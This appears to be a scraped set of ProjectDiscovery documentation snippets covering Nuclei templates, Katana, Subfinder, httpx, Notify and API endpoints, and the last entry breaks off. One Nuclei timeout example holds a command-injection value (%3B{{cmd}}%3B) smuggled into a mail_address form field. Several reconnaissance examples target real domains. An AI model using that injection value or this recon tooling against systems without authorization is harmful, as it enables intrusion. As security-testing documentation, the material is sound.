Nuclei Network Template\nDESCRIPTION: Shows how to establish a TLS connection to the target server by adding a 'tls://' prefix to the hostname.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network.mdx#2025-04-12_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nhost:\n  - \"tls://{{Hostname}}\"\n```\n\n----------------------------------------\n\nTITLE: Disabling Max Host Error in Nuclei CLI\nDESCRIPTION: Disables the removal of unresponsive hosts from the scan, affecting speed and memory usage.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\n-nmhe or -no-max-host-error\n```\n\n----------------------------------------\n\nTITLE: Using Error Method in GoConsolePrinter\nDESCRIPTION: The Error method outputs error messages to the console. It accepts a string parameter containing the error message to be displayed.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/goconsole.GoConsolePrinter.mdx#2025-04-12_snippet_3\n\nLANGUAGE: TypeScript\nCODE:\n```\nError(msg: string): void\n```\n\n----------------------------------------\n\nTITLE: Configuring Alibaba Cloud Integration in YAML\nDESCRIPTION: This YAML snippet shows the configuration for Alibaba Cloud integration. It includes provider name, optional ID, region ID, and access key credentials.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/integrations.mdx#2025-04-12_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: alibaba # provider is the name of the provider\n  # id is the name defined by user for filtering (optional)\n  id: staging\n  # alibaba_region_id is the region id of the resources\n  alibaba_region_id: $ALIBABA_REGION_ID\n  # alibaba_access_key is the access key ID for alibaba cloud account\n  alibaba_access_key: $ALIBABA_ACCESS_KEY\n  # alibaba_access_key_secret is the secret access key for alibaba cloud account\n  alibaba_access_key_secret: $ALIBABA_ACCESS_KEY_SECRET\n```\n\n----------------------------------------\n\nTITLE: Connecting to SSH Server in JavaScript\nDESCRIPTION: Connects to an SSH server using host, port, username, and password. Returns a boolean indicating success.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ssh.SSHClient.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst ssh = require('nuclei/ssh');\nconst client = new ssh.SSHClient();\nconst connected = client.Connect('acme.com', 22, 'username', 'password');\n```\n\n----------------------------------------\n\nTITLE: Running Subfinder with Docker\nDESCRIPTION: This snippet shows how to run Subfinder using the Docker image. It demonstrates the basic usage of Subfinder within a Docker container.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/subfinder/running.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ndocker run projectdiscovery/subfinder:latest -d hackerone.com\n```\n\n----------------------------------------\n\nTITLE: Configuring Go Binary Path\nDESCRIPTION: Commands to add Go binary path to system PATH variable in Linux/OSX environments.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/naabu/install.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\necho export $PATH=$PATH:$HOME/go/bin >> $home/.bashrc\nsource $home/.bashrc\n```\n\n----------------------------------------\n\nTITLE: Running Katana without Scope\nDESCRIPTION: Illustrates how to disable the default scoping behavior of Katana to crawl without restrictions.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_13\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -ns\n```\n\n----------------------------------------\n\nTITLE: Custom Provider Config Usage in Notify\nDESCRIPTION: Shows how to use a custom provider configuration file\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/running.mdx#2025-04-12_snippet_6\n\nLANGUAGE: sh\nCODE:\n```\nnotify -provider-config providers.yaml\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP Pipelining in Nuclei YAML Template\nDESCRIPTION: This YAML snippet demonstrates how to configure HTTP pipelining attributes in a Nuclei template. It sets unsafe mode, enables pipelining, and configures concurrent connections and requests per connection.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/connection-tampering.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nunsafe: true\npipeline: true\npipeline-concurrent-connections: 40\npipeline-requests-per-connection: 25000\n```\n\n----------------------------------------\n\nTITLE: Installing Katana using Go\nDESCRIPTION: This command installs ProjectDiscovery's Katana using Go. It requires Go to be installed on the system.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/install.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngo install github.com/projectdiscovery/katana/cmd/katana@latest\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint Specification for Template Retrieval\nDESCRIPTION: This YAML specification defines a GET endpoint for retrieving template details by ID. The endpoint path includes a template_id parameter and would return template information when called.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/templates/get-shared-template.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/template/share/{template_id}\n```\n\n----------------------------------------\n\nTITLE: Extending CSSType Definitions with Type Assertion in TypeScript\nDESCRIPTION: Example of using TypeScript type assertion to extend CSSType definitions. It shows how to add missing properties and CSS custom properties.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/csstype/README.md#2025-04-12_snippet_10\n\nLANGUAGE: typescript\nCODE:\n```\nconst style: CSS.Properties = {\n  // Add a missing property\n  ['WebkitRocketLauncher' as any]: 'launching',\n\n  // Add a CSS Custom Property\n  ['--theme-color' as any]: 'black',\n};\n```\n\n----------------------------------------\n\nTITLE: Combining subfinder and httpx for Web Reconnaissance in Bash\nDESCRIPTION: This snippet demonstrates how to pipe results from subfinder directly into httpx to identify active web servers and their technologies across subdomains of a given target.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\nsubfinder -d hackerone.com -silent| httpx -title -tech-detect -status-code\n```\n\n----------------------------------------\n\nTITLE: Configuring Gotify Notifications in YAML\nDESCRIPTION: Gotify server configuration with host, port, token and message formatting options.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/provider-config.mdx#2025-04-12_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\ngotify:\n  - id: 'gotify'\n    gotify_host: 'XXXXXX'\n    gotify_port: '80'\n    gotify_token: 'XXXXXX'\n    gotify_format: '{{data}}'\n    gotify_disabletls: false\n    gotify_title: \"recon\"\n```\n\n----------------------------------------\n\nTITLE: Specifying Host in Nuclei Network Template\nDESCRIPTION: Demonstrates how to specify the host to connect to, using a dynamic variable. This allows for flexible targeting of hosts.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network.mdx#2025-04-12_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nhost: \n  - \"{{Hostname}}\"\n```\n\n----------------------------------------\n\nTITLE: Calculating Buffer Size with Structs Module\nDESCRIPTION: Shows how to calculate the number of bytes needed to pack values using a given format string. Returns a number indicating the required buffer size or null if the format is invalid.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/structs.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst structs = require('nuclei/structs');\nconst size = structs.CalcSize('H');\n```\n\n----------------------------------------\n\nTITLE: LDAP Connection Close\nDESCRIPTION: Closes the LDAP connection properly.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Client.mdx#2025-04-12_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com');\nclient.Close();\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI User Subscription GET Endpoint\nDESCRIPTION: OpenAPI YAML specification defining the GET endpoint for retrieving user subscription information at /v1/user/subscription.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/users/get-subscription-status.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/user/subscription\n```\n\n----------------------------------------\n\nTITLE: Specifying Multiple Ports in Nuclei Network Template\nDESCRIPTION: Demonstrates how to specify multiple ports in the 'port' field, introduced in Nuclei v3.1.0, allowing for scanning on multiple ports.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network.mdx#2025-04-12_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nport: 5432,5433\n```\n\n----------------------------------------\n\nTITLE: Running Subfinder with Docker and Local Config\nDESCRIPTION: This command runs Subfinder in a Docker container while using a local configuration file. It demonstrates how to mount a local directory to the container for custom configurations.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/subfinder/running.mdx#2025-04-12_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ndocker run -v $CONFIG/subfinder:/root/.config/subfinder -t projectdiscovery/subfinder -d hackerone.com\n```\n\n----------------------------------------\n\nTITLE: Setting Chaos API Key\nDESCRIPTION: Illustrates how to set the API key for Chaos, which is required for authentication.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/chaos/usage.mdx#2025-04-12_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nchaos -key API_KEY\n```\n\n----------------------------------------\n\nTITLE: Displaying Body Preview with httpx in Bash\nDESCRIPTION: This snippet demonstrates how to use httpx to display a preview of the response body, showing the first N characters and optionally stripping HTML tags.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_17\n\nLANGUAGE: bash\nCODE:\n```\nhttpx -u https://example.com -silent -body-preview\n```\n\nLANGUAGE: bash\nCODE:\n```\nhttpx -u https://example.com -silent -body-preview=200 -strip=html\n```\n\n----------------------------------------\n\nTITLE: Array and Data Type Conversion in JavaScript\nDESCRIPTION: Functions for array manipulation and data type conversion. 'to_array' updates an object's prototype to enable Array functions, 'hex_to_ascii' converts hex to ASCII, and 'ToBytes' and 'ToString' convert inputs to byte slices and strings respectively.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/js-helper-functions.mdx#2025-04-12_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nto_array(any) array\nhex_to_ascii(string) string\nToBytes(...interface{}) []byte\nToString(...interface{}) string\n```\n\n----------------------------------------\n\nTITLE: ASN Input Scanning\nDESCRIPTION: Shows how to scan all IP addresses within a specific ASN by providing the ASN number as input to httpx.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/running.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\necho AS14421 | httpx -silent\n```\n\n----------------------------------------\n\nTITLE: Configuring Slack Notifications in YAML\nDESCRIPTION: Configuration for Slack notifications with multiple channels. Includes channel name, bot username, message format and webhook URL settings.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/provider-config.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nslack:\n  - id: \"slack\"\n    slack_channel: \"recon\"\n    slack_username: \"test\"\n    slack_format: \"{{data}}\"\n    slack_webhook_url: \"https://hooks.slack.com/services/XXXXXX\"\n\n  - id: \"vulns\"\n    slack_channel: \"vulns\"\n    slack_username: \"test\"\n    slack_format: \"{{data}}\"\n    slack_webhook_url: \"https://hooks.slack.com/services/XXXXXX\"\n```\n\n----------------------------------------\n\nTITLE: Installing Interactsh Client via Go\nDESCRIPTION: Command to install ProjectDiscovery's Interactsh client using Go install. Requires the latest version of Go to be installed on the system.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/install.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ngo install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for GET /v1/template Endpoint\nDESCRIPTION: This YAML snippet defines an OpenAPI specification for a GET endpoint at /v1/template. The specification appears to be a minimal header indicating the API path and method.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/templates/get-template-list.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/template\n```\n\n----------------------------------------\n\nTITLE: Using CSSType for Pseudo-Selectors\nDESCRIPTION: Example of using CSSType to type-check pseudo-selectors. It demonstrates how to use SimplePseudos for hover effects.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/node_modules/csstype/README.md#2025-04-12_snippet_6\n\nLANGUAGE: typescript\nCODE:\n```\nimport type * as CSS from 'csstype';\n\nconst pseudos: { [P in CSS.SimplePseudos]?: CSS.Properties } = {\n  ':hover': {\n    display: 'flex',\n  },\n};\n```\n\n----------------------------------------\n\nTITLE: Katana Configuration Options\nDESCRIPTION: Complete list of configuration-related CLI options available in Katana\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_21\n\nLANGUAGE: console\nCODE:\n```\nkatana -h config\n\nFlags:\nCONFIGURATION:\n   -r, -resolvers string[]       list of custom resolver (file or comma separated)\n   -d, -depth int                maximum depth to crawl (default 3)\n   -jc, -js-crawl                enable endpoint parsing / crawling in javascript file\n   -ct, -crawl-duration int      maximum duration to crawl the target for\n   -kf, -known-files string      enable crawling of known files (all,robotstxt,sitemapxml)\n   -mrs, -max-response-size int  maximum response size to read (default 9223372036854775807)\n   -timeout int                  time to wait for request in seconds (default 10)\n   -aff, -automatic-form-fill    enable automatic form filling (experimental)\n   -fx, -form-extraction         enable extraction of form, input, textarea & select elements\n   -retry int                    number of times to retry the request (default 1)\n   -proxy string                 http/socks5 proxy to use\n   -H, -headers string[]         custom header/cookie to include in request\n   -config string                path to the katana configuration file\n   -fc, -form-config string      path to custom form configuration file\n   -flc, -field-config string    path to custom field configuration file\n   -s, -strategy string          Visit strategy (depth-first, breadth-first) (default \"depth-first\")\n```\n\n----------------------------------------\n\nTITLE: Configuring Google Chat Notifications in YAML\nDESCRIPTION: Google Chat integration setup with key, token and space configurations.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/provider-config.mdx#2025-04-12_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\ngooglechat:\n  - id: \"gc\"\n    key: \"XXXXXXXX\"\n    token: \"XXXXXX\"\n    space: \"XXXXXX\"\n    google_chat_format: \"{{data}}\"\n```\n\n----------------------------------------\n\nTITLE: Installing Nuclei from GitHub\nDESCRIPTION: This set of commands clones the Nuclei repository, builds the binary, moves it to the system path, and verifies the installation. It requires the latest version of Go to be installed.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/install.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/projectdiscovery/nuclei.git; \\\ncd nuclei/cmd/nuclei; \\\ngo build; \\\nmv nuclei /usr/local/bin/; \\\nnuclei -version;\n```\n\n----------------------------------------\n\nTITLE: Receiving Full Data Block\nDESCRIPTION: Example of receiving a complete block of data with specified size.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/net.NetConn.mdx#2025-04-12_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst net = require('nuclei/net');\nconst conn = net.Open('tcp', 'acme.com:80');\nconst data = conn.RecvFull(1024);\n```\n\n----------------------------------------\n\nTITLE: Installing Nuclei Using Go\nDESCRIPTION: Command to install the latest version of Nuclei using Go, which is required to connect to PDCP free tier.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/free/nuclei-setup.mdx#2025-04-12_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\ngo install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification for API Key Generation Endpoint in YAML\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the POST /v1/user/apikey endpoint. It outlines the request body parameters, possible response codes, and schema for successful and error responses.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/users/create-api-key.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/user/apikey\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification for GET /v1/template/public Endpoint\nDESCRIPTION: This YAML specification defines the OpenAPI structure for the public template endpoint. It details the API path, operation, and expected responses for retrieving public templates.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/templates/get-public-template-list.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/template/public\n```\n\n----------------------------------------\n\nTITLE: Installing PDTM via Go\nDESCRIPTION: Command to install ProjectDiscovery's Chaos Client using Go package manager. Requires latest version of Go to be installed on the system.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/pdtm/install.mdx#2025-04-12_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\ngo install -v github.com/projectdiscovery/pdtm/cmd/pdtm@latest\n```\n\n----------------------------------------\n\nTITLE: Basic AlterX Usage Example\nDESCRIPTION: Example of running AlterX with chaos and dnsx to discover new subdomains.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/alterx/running.mdx#2025-04-12_snippet_3\n\nLANGUAGE: console\nCODE:\n```\n$ chaos -d tesla.com | alterx | dnsx\n\n \n\n   ___   ____          _  __\n  / _ | / / /____ ____| |/_/\n / __ |/ / __/ -_) __/>  <  \n/_/ |_/_/\\__/\\__/_/ /_/|_|              \n\n      projectdiscovery.io\n\n[INF] Generated 8312 permutations in 0.0740s\nauth-global-stage.tesla.com\nauth-stage.tesla.com\ndigitalassets-stage.tesla.com\nerrlog-stage.tesla.com\nkronos-dev.tesla.com\nmfa-stage.tesla.com\npaymentrecon-stage.tesla.com\nsso-dev.tesla.com\nshop-stage.tesla.com\nwww-uat-dev.tesla.com\n```\n\n----------------------------------------\n\nTITLE: Configuring Headless Scanning Parameters in Nuclei CLI\nDESCRIPTION: Sets the headless bulk size and concurrency flags for resource-intensive headless templates in Nuclei.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n-hbs <number> -headc <number>\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Template Endpoint Specification\nDESCRIPTION: YAML specification defining a POST endpoint at /v1/template path\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/templates/create-template.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/template\n```\n\n----------------------------------------\n\nTITLE: URL Pattern Matching with Regex in Katana\nDESCRIPTION: Shows how to use regex patterns to match specific URLs in the crawler output using the -mr flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_25\n\nLANGUAGE: shell\nCODE:\n```\nkatana -u https://tesla.com -mr 'https://shop\\.tesla\\.com/*' -silent\n```\n\n----------------------------------------\n\nTITLE: Running Katana with Crawl Duration Limit\nDESCRIPTION: Demonstrates how to set a predefined crawl duration limit for Katana.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_17\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -ct 2\n```\n\n----------------------------------------\n\nTITLE: Setting Custom Timeout with Request Annotation in Nuclei\nDESCRIPTION: This snippet shows how to set a custom timeout for a specific HTTP request using the @timeout annotation in a Nuclei template.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/request-tampering.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n- |\n  @timeout: 25s\n  POST /conf_mail.php HTTP/1.1\n  Host: {{Hostname}}\n  Content-Type: application/x-www-form-urlencoded\n  \n  mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M\n```\n\n----------------------------------------\n\nTITLE: Configuring Code Execution Engines in Nuclei\nDESCRIPTION: Specifies the language interpreters to be used for code execution. The system searches for these interpreters sequentially until a suitable one is found.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/code.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n- engine:\n    - py\n    - python3\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Scan Token Endpoint Specification\nDESCRIPTION: OpenAPI specification defining the GET /v1/scans/token endpoint path\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/get-scans-token.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/scans/token\n```\n\n----------------------------------------\n\nTITLE: Embedding Nuclei Template Editor with iframe\nDESCRIPTION: HTML code to embed the Nuclei Template Editor interface within a webpage. The iframe displays a public template for CVE-2023-0297, with specified dimensions of 700px width and height.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/editor/introduction_old.mdx#2025-04-12_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<iframe\n  src=\"https://cloud.projectdiscovery.io/public/CVE-2023-0297\"\n  width=\"700px\"\n  height=\"700px\"\n></iframe>\n```\n\n----------------------------------------\n\nTITLE: Running Katana in Headless Mode with No Sandbox\nDESCRIPTION: Demonstrates how to run Katana in headless mode without sandbox, useful when running as root user.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nkatana -u https://tesla.com -headless -no-sandbox\n```\n\n----------------------------------------\n\nTITLE: Configuring Nomad Provider in YAML\nDESCRIPTION: Example configuration block for integrating Hashicorp Nomad with Cloudlist. Requires the Nomad server URL and optional authentication details.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/providers.mdx#2025-04-12_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\n- provider: nomad\n  nomad_url: http:/127.0.0.1:4646/\n  # nomad_ca_file: <path-to-ca-file>.pem\n  # nomad_cert_file: <path-to-cert-file>.pem\n  # nomad_key_file: <path-to-key-file>.pem\n  # nomad_token: <nomad-token>\n  # nomad_http_auth: <nomad-http-auth-value>\n```\n\n----------------------------------------\n\nTITLE: Displaying Subfinder Help Options in Bash\nDESCRIPTION: This snippet shows the complete list of command-line flags and options available in Subfinder. It includes options for input, source selection, filtering, rate limiting, output formatting, configuration, and debugging.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/subfinder/usage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nFlags:\nINPUT:\n  -d, -domain string[]  domains to find subdomains for\n  -dL, -list string     file containing list of domains for subdomain discovery\n\nSOURCE:\n  -s, -sources string[]           specific sources to use for discovery (-s crtsh,github). Use -ls to display all available sources.\n  -recursive                      use only sources that can handle subdomains recursively (e.g. subdomain.domain.tld vs domain.tld)\n  -all                            use all sources for enumeration (slow)\n  -es, -exclude-sources string[]  sources to exclude from enumeration (-es alienvault,zoomeyeapi)\n\nFILTER:\n  -m, -match string[]   subdomain or list of subdomain to match (file or comma separated)\n  -f, -filter string[]   subdomain or list of subdomain to filter (file or comma separated)\n\nRATE-LIMIT:\n  -rl, -rate-limit int  maximum number of http requests to send per second\n  -rls value            maximum number of http requests to send per second four providers in key=value format (-rls \"hackertarget=10/s,shodan=15/s\")\n  -t int                number of concurrent goroutines for resolving (-active only) (default 10)\n\nUPDATE:\n   -up, -update                 update subfinder to latest version\n   -duc, -disable-update-check  disable automatic subfinder update check\n\nOUTPUT:\n  -o, -output string       file to write output to\n  -oJ, -json               write output in JSONL(ines) format\n  -oD, -output-dir string  directory to write output (-dL only)\n  -cs, -collect-sources    include all sources in the output (-json only)\n  -oI, -ip                 include host IP in output (-active only)\n\nCONFIGURATION:\n  -config string                flag config file (default \"$CONFIG/subfinder/config.yaml\")\n  -pc, -provider-config string  provider config file (default \"$CONFIG/subfinder/provider-config.yaml\")\n  -r string[]                   comma separated list of resolvers to use\n  -rL, -rlist string            file containing list of resolvers to use\n  -nW, -active                  display active subdomains only\n  -proxy string                 http proxy to use with subfinder\n  -ei, -exclude-ip              exclude IPs from the list of domains\n\nDEBUG:\n  -silent             show only subdomains in output\n  -version            show version of subfinder\n  -v                  show verbose output\n  -nc, -no-color      disable color in output\n  -ls, -list-sources  list all available sources\n\nOPTIMIZATION:\n  -timeout int   seconds to wait before timing out (default 30)\n  -max-time int  minutes to wait for enumeration results (default 10)\n```\n\n----------------------------------------\n\nTITLE: Defining LDAP Entry Interface in TypeScript\nDESCRIPTION: This snippet defines the Entry interface for LDAP operations. It includes two optional properties: Attributes of type EntryAttribute, and DN of type string. The interface is part of the ldap module.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Entry.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface Entry {\n  Attributes?: EntryAttribute;\n  DN?: string;\n}\n```\n\n----------------------------------------\n\nTITLE: Downloading API Specification\nDESCRIPTION: Script execution command to download the latest OpenAPI specification.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/README.md#2025-04-12_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n./bin/download-api.sh\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for Asset Enumeration Filters in YAML\nDESCRIPTION: This YAML snippet specifies an OpenAPI endpoint for retrieving filters associated with an asset enumeration. It defines the path parameters, response codes, and schema for the API operation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/enumerations/group-assets-by-filters-for-an-enumeration.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/asset/enumerate/{enumerate_id}/filters\n```\n\n----------------------------------------\n\nTITLE: Data Export Functions in JavaScript\nDESCRIPTION: Functions for exporting data. 'Export' converts a value to a string and appends it to the script output, while 'ExportAs' exports a value with a specified key for use in DSL and response.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/js-helper-functions.mdx#2025-04-12_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nExport(value any)\nExportAs(key string,value any)\n```\n\n----------------------------------------\n\nTITLE: Configuring Payload Concurrency in Nuclei CLI\nDESCRIPTION: Sets the maximum number of payloads to run in parallel for each template with 'payloads' field but without 'threads' field.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/mass-scanning-cli.mdx#2025-04-12_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n-pc <number> or -payload-concurrency <number>\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Endpoint Specification for GET /v1/scans/{scan_id}\nDESCRIPTION: YAML specification defining the API endpoint for retrieving scan details by ID parameter.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/get-scan.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/scans/{scan_id}\n```\n\n----------------------------------------\n\nTITLE: Using Buffer.Len() Method in JavaScript\nDESCRIPTION: Demonstrates how to use the Len() method to get the length of the buffer as a number.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/bytes.Buffer.mdx#2025-04-12_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst bytes = require('nuclei/bytes');\nconst buffer = new bytes.Buffer();\nbuffer.WriteString('hello');\nlog(buffer.Len());\n```\n\n----------------------------------------\n\nTITLE: Verifying PostgreSQL Instance\nDESCRIPTION: Checks if a given host and port are running a PostgreSQL database. Returns boolean indicating if Postgres is detected.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/postgres.PGClient.mdx#2025-04-12_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst postgres = require('nuclei/postgres');\nconst isPostgres = postgres.IsPostgres('acme.com', 5432);\n```\n\n----------------------------------------\n\nTITLE: Installing Prerequisites on Ubuntu for Katana\nDESCRIPTION: These commands install necessary prerequisites on Ubuntu for running Katana. It includes updating packages, installing required tools, and setting up Google Chrome.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/install.mdx#2025-04-12_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\nsudo apt update\nsudo snap refresh\nsudo apt install zip curl wget git\nsudo snap install golang --classic\nwget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add - \nsudo sh -c 'echo \"deb http://dl.google.com/linux/chrome/deb/ stable main\" >> /etc/apt/sources.list.d/google.list'\nsudo apt update \nsudo apt install google-chrome-stable\n```\n\n----------------------------------------\n\nTITLE: Basic File Protocol Block in Nuclei\nDESCRIPTION: The starting block for defining a Nuclei template that works with the file protocol. This is the foundation for creating templates that scan local files.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/file.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Start of file template block\nfile:\n```\n\n----------------------------------------\n\nTITLE: Initializing Code Protocol in Nuclei Template\nDESCRIPTION: Basic syntax for starting the code protocol section in a Nuclei template. This defines the beginning of code-related instructions within the template.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/code.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Start the requests for the template right here\ncode:\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint Definition for Vulnerability Details\nDESCRIPTION: OpenAPI specification defining the GET endpoint path for retrieving vulnerability scan details by vulnerability ID.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/results/get-scan-vulnerability.mdx#2025-04-12_snippet_0\n\nLANGUAGE: 